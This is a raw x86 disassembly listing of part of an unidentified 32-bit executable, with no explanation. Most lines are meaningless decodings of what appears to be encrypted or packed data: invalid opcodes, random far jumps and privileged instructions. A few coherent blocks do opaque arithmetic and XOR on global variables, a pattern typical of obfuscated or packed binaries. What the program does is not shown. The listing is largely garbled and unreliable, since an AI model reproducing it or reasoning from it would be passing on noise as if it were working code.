  4059d8:	test   eax,0xac8004b4
  4059dd:	pop    ebp
  4059de:	cmp    BYTE PTR [eax+0x34449547],ch
  4059e4:	mov    esi,0x593403ef
  4059e9:	fcomp  DWORD PTR ds:0xa538a008
  4059ef:	ins    BYTE PTR es:[edi],dx
  4059f0:	retf   
  4059f1:	inc    ecx
  4059f2:	mov    ebp,0x5af1c389
  4059f7:	sub    cl,bh
  4059f9:	add    DWORD PTR [esi-0x13],0x1
  4059fd:	push   ebx
  4059fe:	and    BYTE PTR [edi-0xd429151],0x6f
  405a05:	(bad)  
  405a06:	xchg   ebx,eax
  405a07:	jne    0x4059b6
  405a09:	dec    esi
  405a0a:	adc    BYTE PTR [ebx],0x7e
  405a0d:	maskmovq mm2,(bad)
  405a0e:	not    DWORD PTR [edx]
  405a10:	xor    ebx,ebp
  405a12:	inc    ebx
  405a13:	ins    DWORD PTR es:[edi],dx
  405a14:	(bad)  
  405a15:	shl    BYTE PTR [eax],0xd9
  405a18:	sbb    ah,BYTE PTR [edx-0x74]
  405a1b:	inc    ebp
  405a1c:	pop    esi
  405a1e:	lods   al,BYTE PTR ds:[esi]
  405a1f:	ss (bad) 
  405a21:	nop
  405a22:	stos   DWORD PTR es:[edi],eax
  405a23:	mov    edi,0xd56ff8bb
  405a28:	xor    cl,dl
  405a2a:	das    
  405a2b:	(bad)  
  405a2c:	imul   esi,DWORD PTR [eax+esi*2+0x25],0x91721847
  405a34:	mov    eax,0x463094a
  405a39:	call   0x322da349
  405a3e:	dec    ebx
  405a3f:	jb     0x405a15
  405a41:	or     BYTE PTR [edi+0x5c6abee1],al
  405a47:	sub    eax,0x65452fbe
  405a4c:	sub    BYTE PTR [ebp+0x45c7d6ca],al
  405a52:	clc    
  405a53:	xor    DWORD PTR [ebp-0x1d7e0764],eax
  405a59:	jnp    0x405ad4
  405a5b:	add    BYTE PTR [eax],al
  405a5d:	mov    DWORD PTR [ebp-0x4],0xf89c8530
  405a64:	and    edx,edx
  405a66:	mov    eax,DWORD PTR [ebp-0x4]
  405a69:	sbb    ecx,DWORD PTR ds:0x42fd05
  405a6f:	push   esi
  405a70:	mov    esi,DWORD PTR [ebp-0x8]
  405a73:	and    DWORD PTR ds:0x42fcf1,0x0
  405a7d:	jmp    0x405a8f
  405a82:	mov    edx,DWORD PTR ds:0x42fcf1
  405a88:	inc    edx
  405a89:	mov    DWORD PTR ds:0x42fcf1,edx
  405a8f:	cmp    DWORD PTR ds:0x42fcf1,0x17
  405a96:	jae    0x405b0b
  405a9c:	cmp    DWORD PTR ds:0x42fcf1,0x1d
  405aa3:	jne    0x405ab5
  405aa9:	push   DWORD PTR [ebp-0x24]
  405aac:	push   DWORD PTR [ebp-0x20]
  405aaf:	call   DWORD PTR ds:0x42e2db
  405ab5:	jmp    0x405a82
  405aba:	mov    DWORD PTR ds:0x42fcd9,0x14
  405ac4:	cmp    DWORD PTR ds:0x42fcd9,0x0
  405acb:	je     0x405b0b
  405ad1:	cmp    DWORD PTR ds:0x42fcd9,0x16
  405ad8:	jne    0x405af7
  405ade:	push   DWORD PTR [ebp-0x14]
  405ae1:	push   0x2e3f
  405ae6:	push   DWORD PTR [ebp-0x18]
  405ae9:	push   DWORD PTR [ebp-0x18]
  405aec:	push   0x8cdb
  405af1:	call   DWORD PTR ds:0x42e537
  405af7:	xor    edx,edx
  405af9:	xor    edx,DWORD PTR ds:0x42fcd9
  405aff:	dec    edx
  405b00:	mov    DWORD PTR ds:0x42fcd9,edx
  405b06:	jmp    0x405ac4
  405b0b:	mov    edx,0x7510855
  405b10:	add    DWORD PTR ds:0x42fcd1,edi
  405b16:	xor    eax,edx
  405b18:	and    DWORD PTR ds:0x42e6f7,ebx
  405b1e:	xor    esi,edx
  405b20:	mov    ecx,0x32729c
  405b25:	add    esi,ecx
  405b27:	add    eax,ecx
  405b29:	imul   eax,esi
  405b2c:	mov    esi,DWORD PTR [ebp+0xc]
  405b2f:	cmp    esi,eax
  405b31:	jne    0x405b4d
  405b37:	mov    eax,DWORD PTR [ebp-0x4]
  405b3a:	mov    esi,DWORD PTR [ebp-0x8]
  405b3d:	xor    eax,edx
  405b3f:	xor    esi,edx
  405b41:	add    eax,ecx
  405b43:	add    esi,ecx
  405b45:	imul   eax,esi
  405b48:	jmp    0x405e5b
  405b4d:	mov    eax,DWORD PTR [ebp+0xc]
  405b50:	mov    eax,DWORD PTR [eax+0x78]
  405b53:	mov    DWORD PTR [ebp+0xc],eax
  405b56:	mov    eax,DWORD PTR [ebp-0x4]
  405b59:	mov    esi,DWORD PTR [ebp-0x8]
  405b5c:	xor    eax,edx
  405b5e:	xor    esi,edx
  405b60:	add    eax,ecx
  405b62:	add    esi,ecx
  405b64:	imul   eax,esi
  405b67:	mov    esi,DWORD PTR [ebp+0xc]
  405b6a:	cmp    esi,eax
  405b6c:	mov    eax,DWORD PTR [ebp-0x4]
  405b6f:	je     0x405b3a
  405b75:	jmp    0x405e48
  405b7a:	xchg   DWORD PTR [ebx-0xdac0d75],edi
  405b80:	imul   esi,DWORD PTR gs:[eax+0x3],0xd0a2624d
  405b88:	sar    DWORD PTR [ecx],1
  405b8a:	test   BYTE PTR [edx],dh
  405b8c:	jo     0x405bfe
  405b8e:	stos   BYTE PTR es:[edi],al
  405b8f:	jle    0x405c01
  405b91:	jo     0x405bdf
  405b93:	rcr    bh,0xe8
  405b96:	and    DWORD PTR [edx+0x57],ebp
  405b99:	push   ecx
  405b9a:	(bad)  
  405b9c:	out    dx,eax
  405b9d:	in     eax,0x32
  405b9f:	xchg   al,cl
  405ba1:	loop   0x405b70
  405ba3:	popf   
  405ba4:	mov    ah,0x60
  405ba6:	dec    eax
  405ba7:	clc    
  405ba8:	cmp    edi,edi
  405baa:	xchg   edx,eax
  405bab:	out    dx,eax
  405bac:	mov    bl,0x3c
  405bae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405baf:	dec    ebx
  405bb0:	ds loope 0x405bcb
  405bb3:	push   ebp
  405bb4:	pushf  
  405bb5:	rcr    BYTE PTR [eax],cl
  405bb7:	push   ds
  405bb8:	cwde   
  405bb9:	jmp    0x314f:0xff9b01ec
  405bc0:	fst    QWORD PTR [ebp+0x66]
  405bc3:	scas   eax,DWORD PTR es:[edi]
  405bc4:	mov    ecx,0xa34b44d4
  405bc9:	bound  ecx,QWORD PTR [ebp+0x2e924f41]
  405bcf:	xor    ebp,DWORD PTR [esi]
  405bd1:	pop    ebp
  405bd2:	mov    ds:0x8a2d6d70,eax
  405bd7:	leave  
  405bd8:	inc    eax
  405bd9:	inc    esi
  405bda:	dec    edi
  405bdb:	repnz sub al,0x88
  405bde:	sbb    ebx,DWORD PTR [ecx]
  405be0:	mov    al,0x6e
  405be2:	scas   eax,DWORD PTR es:[edi]
  405be3:	test   BYTE PTR [edi+0x1c],bh
  405be6:	clc    
  405be7:	adc    DWORD PTR [edi],eax
  405be9:	sahf   
  405bea:	inc    ebx
  405beb:	and    cl,BYTE PTR [ecx+0x42e51c5]
  405bf1:	out    dx,al
  405bf2:	shr    BYTE PTR [ebp-0x656a54a2],1
  405bf8:	cmp    edx,DWORD PTR [esi+0x42324839]
  405bfe:	mov    esi,0x5c06ef7c
  405c03:	sbb    eax,DWORD PTR [ecx+0x1d27e2a0]
  405c09:	jle    0x405c14
  405c0b:	pop    ecx
  405c0c:	adc    ebx,DWORD PTR [esp+ecx*2]
  405c0f:	in     eax,0x83
  405c11:	push   es
  405c12:	enter  0xa90e,0x26
  405c16:	pushf  
  405c17:	mov    al,ds:0xb1b0820
  405c1c:	sbb    cl,BYTE PTR [edi+0xdade8d6]
  405c22:	fnstcw WORD PTR [ecx-0x12]
  405c25:	pop    edx
  405c26:	inc    ebp
  405c27:	popf   
  405c28:	mov    fs,WORD PTR [ebp-0x2db65527]
  405c2e:	sbb    al,0xef
  405c30:	int    0xdf
  405c32:	je     0x405bf9
  405c34:	lods   al,BYTE PTR cs:[esi]
  405c36:	jp     0x405c2b
  405c38:	push   0xffffff8f
  405c3a:	mov    dl,BYTE PTR [esi-0x79]
  405c3d:	lahf   
  405c3e:	sbb    esi,DWORD PTR [ebx-0x4]
  405c41:	mov    ebp,0x52d7743f
  405c46:	mov    ds:0xd1cdca37,al
  405c4b:	stos   BYTE PTR es:[edi],al
  405c4c:	retf   
  405c4d:	or     esp,DWORD PTR [eax]
  405c4f:	and    al,0x57
  405c51:	into   
  405c52:	adc    BYTE PTR [esi+0x41],al
  405c55:	enter  0x361,0xb1
  405c59:	int    0x9f
  405c5b:	lock sar DWORD PTR [ebx-0x21090bda],0x30
  405c63:	mov    bh,ch
  405c65:	push   ebp
  405c66:	fimul  DWORD PTR [ebx]
  405c68:	and    ah,BYTE PTR ds:0x28994be7
  405c6e:	xchg   edx,eax
  405c6f:	das    
  405c70:	mov    ah,0xa3
  405c72:	sti    
  405c73:	xchg   ebx,eax
  405c74:	popa   
  405c75:	inc    esp
  405c76:	and    DWORD PTR [eax],esi
  405c78:	adc    BYTE PTR [edi],ch
  405c7a:	jmp    0x6b9d0aa7
  405c7f:	shr    DWORD PTR [ebx+0x6d],0x54
  405c83:	loope  0x405ca5
  405c85:	das    
  405c86:	jecxz  0x405c81
  405c88:	nop
  405c89:	in     al,dx
  405c8a:	pop    ss
  405c8b:	aam    0xac
  405c8d:	push   0xffffffc1
  405c8f:	fdivr  DWORD PTR ss:[edi+0x51a4371d]
  405c96:	sbb    eax,0x9c7f7ecf
  405c9b:	cdq    
  405c9c:	xchg   esi,eax
  405c9d:	inc    ebx
  405c9e:	dec    edx
  405c9f:	push   eax
  405ca0:	dec    edx
  405ca1:	mov    ss,WORD PTR [ecx]
  405ca3:	push   eax
  405ca4:	mov    ds:0x787763cb,eax
  405ca9:	fcmovb st,st(0)
  405cab:	mov    al,ds:0xd4252bb4
  405cb0:	jmp    0xb7e80c59
  405cb5:	mov    bl,0xae
  405cb7:	inc    edi
  405cb8:	sub    cl,bh
  405cba:	push   cs
  405cbb:	repnz add eax,0xa1cd4b45
  405cc1:	pextrw ebx,(bad),0xc5
  405cc3:	pop    edx
  405cc4:	fcos   
  405cc6:	add    esp,0xffffffda
  405cc9:	pop    esp
  405cca:	dec    ebx
  405ccb:	adc    BYTE PTR [edx],0xf1
  405cce:	repnz int3 
  405cd0:	pop    eax
  405cd1:	adc    DWORD PTR [ebx+0x2aeb507b],ecx
  405cd7:	dec    edi
  405cd8:	pop    edx
  405cd9:	mov    eax,0x598a9030
  405cde:	sbb    al,0xf0
  405ce0:	pop    ecx
  405ce1:	repnz into 
  405ce3:	sub    eax,0x3c4211b9
  405ce8:	mov    ?,WORD PTR [edi+0x2a9c9faa]
  405cee:	bound  ebp,QWORD PTR [eax+eax*8+0x6]
  405cf2:	adc    al,BYTE PTR [ebx+ebx*1]
  405cf5:	out    0x99,al
  405cf7:	lea    ebx,[esi]
  405cf9:	sub    eax,0x45051e9e
  405cfe:	cmp    eax,DWORD PTR [ebp+ebp*1+0x3dc9c8b6]
  405d05:	push   edi
  405d06:	xchg   BYTE PTR [ecx-0x1b74910d],cl
  405d0c:	scas   al,BYTE PTR es:[edi]
  405d0d:	inc    esp
  405d0e:	xchg   edi,eax
  405d0f:	sbb    al,0x66
  405d11:	aas    
  405d12:	pop    edx
  405d13:	jmp    0xf19d3e89
  405d18:	cmp    BYTE PTR [edi+0x78],dh
  405d1b:	jge    0x405d96
  405d1d:	test   eax,0x7cf28e20
  405d22:	in     al,0xa2
  405d24:	and    eax,eax
  405d26:	cmp    al,BYTE PTR gs:[ecx+0x48e7ade2]
  405d2d:	xchg   esp,eax
  405d2e:	leave  
  405d2f:	jns    0x405d82
  405d31:	sbb    bl,ch
  405d33:	pop    esp
  405d34:	mov    eax,ds:0xe7296790
  405d39:	and    dl,BYTE PTR [eax+0x1c]
  405d3c:	jbe    0x405d42
  405d3e:	pop    ds
  405d3f:	std    
  405d40:	xchg   edi,eax
  405d41:	or     edi,DWORD PTR [eax+0x28b7bc05]
  405d47:	retf   
  405d48:	fsub   DWORD PTR [eax]
  405d4a:	xor    DWORD PTR [ecx],0x3de9156c
  405d50:	push   esi
  405d51:	dec    ebx
  405d52:	or     dl,dl
  405d54:	mov    ds:0xda94e08a,al
  405d59:	pusha  
  405d5a:	std    
  405d5b:	lods   eax,DWORD PTR gs:[esi]
  405d5d:	lea    ebx,[ebx]
  405d5f:	sbb    ebp,DWORD PTR [edx+0x3410f1e2]
  405d65:	push   eax
  405d66:	pop    eax
  405d67:	sbb    bh,BYTE PTR [ebx]
  405d69:	fst    DWORD PTR [ebx+0x7f]
  405d6c:	push   0x13
  405d6e:	stos   BYTE PTR es:[edi],al
  405d6f:	push   ecx
  405d70:	inc    ebp
  405d71:	aaa    
  405d72:	lods   al,BYTE PTR ds:[esi]
  405d73:	xchg   ecx,eax
  405d74:	aaa    
  405d75:	push   ebp
  405d76:	xchg   esi,eax
  405d77:	add    DWORD PTR [ebx-0x1581cc0f],esp
  405d7d:	sbb    eax,0xd61e5763
  405d82:	aad    0x55
  405d84:	inc    edx
  405d85:	ffreep st(1)
  405d87:	xchg   esp,eax
  405d88:	mov    ecx,eax
  405d8a:	daa    
  405d8b:	xchg   edx,eax
  405d8c:	in     al,dx
  405d8d:	inc    ebp
  405d8e:	push   ds
  405d8f:	or     DWORD PTR [edx-0x68],ebx
  405d92:	cmp    esi,edi
  405d94:	sar    DWORD PTR [ecx],1
  405d96:	mov    cl,0x27
  405d98:	cwde   
  405d99:	std    
  405d9a:	push   ss
  405d9b:	popa   
  405d9c:	data16 and BYTE PTR [ebx+0x78],0xe6
  405da1:	(bad)  [ecx]
  405da3:	inc    edi
  405da4:	mov    BYTE PTR [ebx-0x49b58f7],ah
  405daa:	push   ds
  405dab:	xchg   edi,eax
  405dac:	shr    BYTE PTR [ebx],cl
  405dae:	(bad)  
  405daf:	jmp    0x4753753a
  405db4:	xor    edi,DWORD PTR [ebp+eiz*2-0x63]
  405db8:	retf   0x5bc4
  405dbb:	cli    
  405dbc:	aas    
  405dbd:	retf   
  405dbe:	dec    ecx
  405dbf:	cmp    al,BYTE PTR [ecx-0x3a5bd61d]
  405dc5:	lea    ebp,[eax]
  405dc7:	jg     0x405dd5
  405dc9:	sbb    eax,0xa254b875
  405dce:	popf   
  405dcf:	add    eax,0x946109eb
  405dd4:	dec    ebp
  405dd5:	dec    esp
  405dd6:	ins    BYTE PTR es:[edi],dx
  405dd7:	into   
  405dd8:	inc    edi
  405dd9:	mov    BYTE PTR [edx],dh
  405ddb:	mov    bh,0x58
  405ddd:	xchg   DWORD PTR [ecx+0x4b901734],edx
  405de3:	ds call 0xccba40d
  405de9:	pusha  
  405dea:	jnp    0x405de2
  405dec:	mov    bl,0xf8
  405dee:	push   0xf451672c
  405df3:	iret   
  405df4:	mov    al,ds:0xee23a7f7
  405df9:	ret    
  405dfa:	or     edi,ecx
  405dfc:	scas   al,BYTE PTR es:[edi]
  405dfd:	xlat   BYTE PTR ds:[ebx]
  405dfe:	sub    al,0x6e
  405e00:	and    eax,0xf87451d9
  405e05:	or     ebx,esp
  405e07:	pusha  
  405e08:	and    bh,BYTE PTR [edi]
  405e0a:	in     al,0x1f
  405e0c:	sbb    eax,0x20c33d3a
  405e11:	sub    al,0x8b
  405e13:	and    al,0xb
  405e15:	pusha  
  405e16:	sbb    bl,bh
  405e18:	cli    
  405e19:	cmp    al,0x90
  405e1b:	dec    ebx
  405e1c:	call   ebp
  405e1e:	(bad)  
  405e1f:	rcl    DWORD PTR [ecx+0x3],1
  405e22:	ja     0x405e69
  405e24:	inc    ecx
  405e25:	push   edi
  405e26:	mov    al,0x3a
  405e28:	hlt    
  405e29:	sbb    BYTE PTR [edi-0x1fcc59bf],al
  405e2f:	add    al,0xa2
  405e31:	inc    edx
  405e32:	stc    
  405e33:	int3   
  405e34:	mov    DWORD PTR [eax-0x3a],ebp
  405e37:	xchg   edi,eax
  405e38:	and    bh,cl
  405e3a:	iret   
  405e3b:	jns    0x405e93
  405e3d:	loope  0x405e66
  405e3f:	in     eax,0x56
  405e41:	jbe    0x405dd1
  405e43:	fsub   QWORD PTR [eax+0x33e720af]
  405e49:	ret    0xc103
  405e4c:	mov    ecx,DWORD PTR [ebp+0xc]
  405e4f:	imul   eax,ecx
  405e52:	add    eax,DWORD PTR [ebp+0x8]
  405e55:	mov    DWORD PTR [ebp+0xc],eax
  405e58:	mov    eax,DWORD PTR [ebp+0xc]
  405e5b:	pop    esi
  405e5c:	leave  
  405e5d:	ret    0x8
  405e60:	push   ebp
  405e61:	mov    ebp,esp
  405e63:	push   ecx
  405e64:	add    DWORD PTR ds:0x42e70f,0x1508
  405e6e:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  405e75:	mov    eax,DWORD PTR [ebp-0x4]
  405e78:	mov    edx,DWORD PTR [ebp+0x10]
  405e7b:	adc    DWORD PTR ds:0x42e6ef,0x4006
  405e85:	mov    ecx,0x7510855
  405e8a:	xor    DWORD PTR ds:0x42fd01,0x260
  405e94:	xor    eax,ecx
  405e96:	jmp    0x40605c
  405e9b:	fidiv  DWORD PTR [edx+0x7b]
  405e9e:	jle    0x405e33
  405ea0:	jne    0x405e7b
  405ea2:	jb     0x405e2d
  405ea4:	(bad)  
  405ea5:	(bad)  
  405ea6:	sub    al,0x77
  405ea8:	xor    al,0xfe
  405eaa:	je     0x405eea
  405eac:	aas    
  405ead:	jo     0x405f1f
  405eaf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405eb0:	jg     0x405f22
  405eb2:	jo     0x405f0e
  405eb4:	pop    ds
  405eb5:	push   0xffffffc5
  405eb7:	cld    
  405eb8:	pop    esi
  405eb9:	dec    ecx
  405eba:	mov    WORD PTR [eax+esi*2+0x27],ss
  405ebe:	dec    esp
  405ebf:	stc    
  405ec0:	mov    ebp,DWORD PTR [edi-0x559b079c]
  405ec6:	popf   
  405ec7:	cmp    dh,BYTE PTR [ecx-0x2e]
  405eca:	mov    BYTE PTR [edx],al
  405ecc:	mov    cl,0x24
  405ece:	ret    0x36f1
  405ed1:	mov    eax,0x28e48cc5
  405ed6:	pop    ss
  405ed7:	mov    ds:0x1efa9ce3,al
  405edc:	repnz test DWORD PTR [edi-0x5fcc096a],0xa3e3e2c6
  405ee7:	sar    esi,0x40
  405eea:	fild   DWORD PTR [edi+0x3308011f]
  405ef0:	and    cl,BYTE PTR ds:[ebx+0xdec1f9c]
  405ef7:	ja     0x405eef
  405ef9:	pop    edx
  405efa:	push   es
  405efb:	(bad)  
  405efc:	ja     0x405ea3
  405efe:	ja     0x405ebf
  405f00:	xchg   ah,al
  405f02:	or     DWORD PTR [ebx],ecx
  405f04:	pusha  
  405f05:	jo     0x405f0e
  405f07:	mov    eax,0xc585217e
  405f0c:	xchg   esp,eax
  405f0d:	mov    al,ds:0x3243a297
  405f12:	sbb    cl,BYTE PTR [eax+0x6a]
  405f15:	or     eax,DWORD PTR [ebx]
  405f17:	pushf  
  405f18:	inc    ebx
  405f19:	fstp   QWORD PTR [esi+0x31]
  405f1c:	data16 mov ah,0x9d
  405f1f:	mov    ecx,0x15187b93
  405f24:	fld    DWORD PTR [edx+edi*8-0x29064136]
  405f2b:	mov    dl,0x1f
  405f2d:	jnp    0x405ece
  405f2f:	xchg   ebx,eax
  405f30:	xchg   edx,eax
  405f31:	imul   DWORD PTR [esp+ecx*8]
  405f34:	dec    edi
  405f35:	or     DWORD PTR [esi-0x65],ecx
  405f38:	push   es
  405f39:	xor    eax,0x1136c71f
  405f3e:	mov    eax,0x2fed73df
  405f43:	nop
  405f44:	arpl   WORD PTR [esi+0x10],si
  405f47:	lds    eax,FWORD PTR [eax]
  405f49:	outs   dx,BYTE PTR ds:[esi]
  405f4a:	test   al,0x9d
  405f4c:	fsubr  DWORD PTR [esi+edx*2+0x33e3521f]
  405f53:	(bad)  
  405f54:	enter  0x962f,0xe1
  405f58:	out    dx,al
  405f59:	add    BYTE PTR [edi+0x5037320e],al
  405f5f:	repnz ins BYTE PTR es:[edi],dx
  405f61:	rcr    dh,cl
  405f63:	and    eax,0x7f38cfd2
  405f68:	dec    esp
  405f69:	cs into 
  405f6b:	sbb    ebx,DWORD PTR [ecx]
  405f6d:	adc    BYTE PTR [ecx+ecx*2],bh
  405f70:	xchg   esp,eax
  405f71:	dec    esp
  405f72:	mov    ch,0x29
  405f74:	dec    ebx
  405f75:	ret    0xe49d
  405f78:	jb     0x405fc5
  405f7a:	add    al,0x83
  405f7c:	push   0x7950250
  405f81:	shl    ah,cl
  405f83:	mov    ds:0xdb6b9a01,al
  405f88:	retf   
  405f89:	sbb    esp,DWORD PTR [eax-0x800dba8]
  405f8f:	mov    cl,0x54
  405f91:	call   0x73ab7a41
  405f96:	push   eax
  405f97:	jecxz  0x405f5d
  405f99:	add    DWORD PTR [edx+0x6b],ebx
  405f9c:	and    BYTE PTR [eax-0x613a140],bl
  405fa2:	pusha  
  405fa3:	and    eax,0x5ac0455d
  405fa8:	les    esp,FWORD PTR [edi]
  405faa:	mov    ecx,0x17a313d7
  405faf:	xor    ebp,DWORD PTR [ebp+0x50]
  405fb2:	dec    esp
  405fb3:	fwait
  405fb4:	xchg   esi,eax
  405fb5:	or     bh,bh
  405fb7:	add    eax,edx
  405fb9:	lods   eax,DWORD PTR ds:[esi]
  405fba:	cwde   
  405fbb:	xor    DWORD PTR [edx],ebx
  405fbd:	push   0xffffffc6
  405fbf:	push   es
  405fc0:	sahf   
  405fc1:	add    eax,0x68000088
  405fc6:	outs   dx,BYTE PTR ds:[esi]
  405fc7:	pop    ds
  405fc8:	pop    edi
  405fc9:	mov    al,ds:0x223096ea
  405fce:	push   ds
  405fcf:	jge    0x405fd3
  405fd1:	push   edi
  405fd2:	sbb    ch,BYTE PTR [esi-0x35]
  405fd5:	sbb    bh,0x8f
  405fd8:	mov    esp,esi
  405fda:	(bad)  
  405fdb:	mov    esp,0x10911b95
  405fe0:	cmp    bh,al
  405fe2:	clc    
  405fe3:	repz sbb edi,DWORD PTR cs:[eax-0x59]
  405fe8:	into   
  405fe9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405fea:	(bad)  
  405feb:	call   DWORD PTR [esi+0x55b72e80]
  405ff1:	popa   
  405ff2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405ff3:	fs test bl,cl
  405ff6:	mov    eax,ds:0xbbcd13cf
  405ffb:	pop    es
  405ffc:	xlat   BYTE PTR ds:[ebx]
  405ffd:	inc    ebx
  405ffe:	ficom  WORD PTR [edx+0x4a]
  406001:	jae    0x406079
  406003:	cmp    eax,DWORD PTR [edi-0x3da823d7]
  406009:	pop    ss
  40600a:	retf   
  40600b:	mov    dl,0x47
  40600d:	lock call 0xcf398aaa
  406013:	fisub  WORD PTR [edx+edi*2-0x7c]
  406017:	jmp    0x405fc0
  406019:	mov    gs,WORD PTR [ebx+ebx*1-0x3e]
  40601d:	cwde   
  40601e:	adc    ax,0xa85c
  406022:	outs   dx,BYTE PTR ds:[esi]
  406023:	adc    eax,0xcc6b2317
  406028:	ret    0xddb8
  40602b:	js     0x406008
  40602d:	test   eax,0xfc1780f5
  406032:	xlat   BYTE PTR ds:[ebx]
  406033:	sbb    al,0xd3
  406035:	pop    es
  406036:	out    dx,al
  406037:	xor    dl,BYTE PTR [ebx-0x5b68c25a]
  40603d:	jbe    0x406041
  40603f:	(bad)  
  406040:	pushf  
  406041:	jnp    0x40602c
  406043:	xor    al,0xfe
  406045:	in     al,dx
  406046:	ret    0x9a11
  406049:	cmp    eax,0xd7c371bc
  40604e:	fs mov edx,cs
  406051:	pop    ss
  406052:	sbb    BYTE PTR [ecx+0x40],bh
  406055:	and    dh,BYTE PTR [eax]
  406057:	aad    0xfc
  406059:	cmp    ebp,DWORD PTR [edi-0xc]
  40605c:	add    eax,0x32729c
  406061:	or     DWORD PTR ds:0x42fd86,0xae4
  40606b:	mov    DWORD PTR [edx],eax
  40606d:	mov    eax,DWORD PTR [ebp+0xc]
  406070:	xor    eax,ecx
  406072:	push   esi
  406073:	sbb    edx,DWORD PTR ds:0x42e118
  406079:	mov    esi,DWORD PTR [ebp+0x10]
  40607c:	or     DWORD PTR ds:0x42fd76,edx
  406082:	mov    edx,0x32729c
  406087:	sbb    DWORD PTR ds:0x42fcf1,0x42e11c
  406091:	add    eax,edx
  406093:	adc    DWORD PTR ds:0x42fcd1,0x42e6fb
  40609d:	mov    DWORD PTR [esi+0x4],eax
  4060a0:	sbb    eax,0x6979
  4060a5:	mov    eax,DWORD PTR [ebp+0x14]
  4060a8:	adc    DWORD PTR ds:0x42fd82,0x2335
  4060b2:	mov    esi,DWORD PTR [ebp+0x10]
  4060b5:	sub    DWORD PTR ds:0x42fcd5,0x1c02
  4060bf:	mov    DWORD PTR [esi+0x8],eax
  4060c2:	or     eax,DWORD PTR ds:0x42fd05
  4060c8:	jmp    0x40628e
  4060cd:	out    dx,al
  4060ce:	hlt    
  4060cf:	arpl   WORD PTR [edx],dx
  4060d1:	popa   
  4060d2:	xchg   ecx,eax
  4060d3:	ins    DWORD PTR es:[edi],dx
  4060d4:	hlt    
  4060d5:	(bad)  
  4060d6:	pop    esp
  4060d7:	xor    eax,0xccf19796
  4060dc:	or     eax,0x70703e65
  4060e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4060e2:	jg     0x406154
  4060e4:	jo     0x40610b
  4060e6:	cmc    
  4060e7:	bound  edx,QWORD PTR [ebp+edi*8+0x424555d5]
  4060ee:	sbb    eax,0xbc99475a
  4060f3:	int    0x6b
  4060f5:	in     eax,dx
  4060f6:	or     eax,0x3647b950
  4060fb:	jae    0x406149
  4060fd:	pop    edi
  4060fe:	cdq    
  4060ff:	or     al,BYTE PTR [edx]
  406101:	out    dx,eax
  406102:	daa    
  406103:	mov    ebx,0xaa433a77
  406108:	jp     0x4060ef
  40610a:	sti    
  40610b:	out    dx,eax
  40610c:	fst    DWORD PTR [ebx-0x11]
  40610f:	xchg   edi,eax
  406110:	adc    al,0xee
  406112:	inc    edi
  406113:	sub    eax,0x460177c5
  406118:	(bad)  
  40611a:	fdiv   DWORD PTR [ebp-0x80]
  40611d:	sub    bl,BYTE PTR [ebx-0x4a]
  406120:	jb     0x40613b
  406122:	sub    BYTE PTR [esi+ebp*8-0x2322b32c],ah
  406129:	sub    DWORD PTR [edi],edx
  40612b:	fsub   DWORD PTR [edi-0x55]
  40612e:	ret    
  40612f:	cmp    BYTE PTR [ebx],dl
  406131:	stos   DWORD PTR es:[edi],eax
  406132:	cld    
  406133:	xor    eax,DWORD PTR [eax+ebp*2-0x1babf688]
  40613a:	xor    edi,DWORD PTR [ebx-0x503d9ae3]
  406140:	sar    dh,1
  406142:	jae    0x40610c
  406144:	sbb    esi,ecx
  406146:	pop    eax
  406147:	sbb    DWORD PTR [eax],ecx
  406149:	(bad)  
  40614a:	rcl    BYTE PTR [ebp+esi*1+0x3e],1
  40614e:	pushf  
  40614f:	cmp    al,0xb
  406151:	sbb    al,0x55
  406153:	push   es
  406154:	sbb    BYTE PTR [edi],bl
  406156:	pop    esp
  406157:	add    DWORD PTR [ebp+edi*8-0x68f16137],0x4d25adb9
  406162:	push   edx
  406163:	aad    0x58
  406165:	mov    dl,0xcf
  406167:	add    DWORD PTR [esi+0x63],0xa07cdded
  40616e:	jbe    0x40614d
  406170:	aam    0x9c
  406172:	adc    BYTE PTR [ebp+0x6a6cc569],dh
  406178:	ja     0x40610d
  40617a:	mov    edx,0x5edd0a65
  40617f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406180:	add    esp,ebx
  406182:	dec    ebx
  406183:	push   es
  406184:	jg     0x4061fa
  406186:	fdiv   QWORD PTR [ebp+0x48]
  406189:	xchg   esi,eax
  40618a:	test   BYTE PTR [ebx+ebp*4-0x2b],dl
  40618e:	inc    esp
  40618f:	inc    ecx
  406190:	adc    DWORD PTR [esi],ecx
  406192:	jg     0x40618b
  406194:	xchg   ecx,eax
  406195:	out    dx,eax
  406196:	xor    eax,0xa8c544b3
  40619b:	jmp    0x9ade:0x7d5b5cf2
  4061a2:	push   0x7d51b6
  4061a7:	out    dx,al
  4061a8:	inc    BYTE PTR [ebp-0x55]
  4061ab:	ffree  st(7)
  4061ad:	ins    BYTE PTR es:[edi],dx
  4061ae:	mov    bh,0x45
  4061b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4061b1:	es js  0x4061ef
  4061b4:	dec    eax
  4061b5:	stc    
  4061b6:	outs   dx,DWORD PTR ds:[esi]
  4061b7:	pushf  
  4061b8:	inc    esp
  4061b9:	mov    al,ds:0xe632a3bd
  4061be:	mov    edi,0xff42ec50
  4061c3:	arpl   WORD PTR [ecx+0x5c],cx
  4061c6:	inc    ebp
  4061c7:	sbb    ch,cl
  4061c9:	xor    ecx,esp
  4061cb:	dec    ebp
  4061cd:	fistp  WORD PTR [ebp+0x324040dc]
  4061d3:	sbb    DWORD PTR [esp+ebp*1],edi
  4061d6:	add    DWORD PTR [esi+0x62dc760b],ecx
  4061dc:	test   DWORD PTR [edi-0x233d4bf6],edx
  4061e2:	gs mov esp,0x29e3d1a5
  4061e8:	bound  ebp,QWORD PTR [ecx+0x26]
  4061eb:	sub    ebx,DWORD PTR [edx-0x7d7d048e]
  4061f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4061f2:	xchg   BYTE PTR [eax-0x5e],ch
  4061f5:	mov    BYTE PTR [edx+0x4a],al
  4061f8:	mov    bh,0x1d
  4061fa:	sbb    BYTE PTR [edi-0x1f],dl
  4061fd:	lods   eax,DWORD PTR ds:[esi]
  4061fe:	xor    BYTE PTR [edx+edx*8-0x62d60725],ah
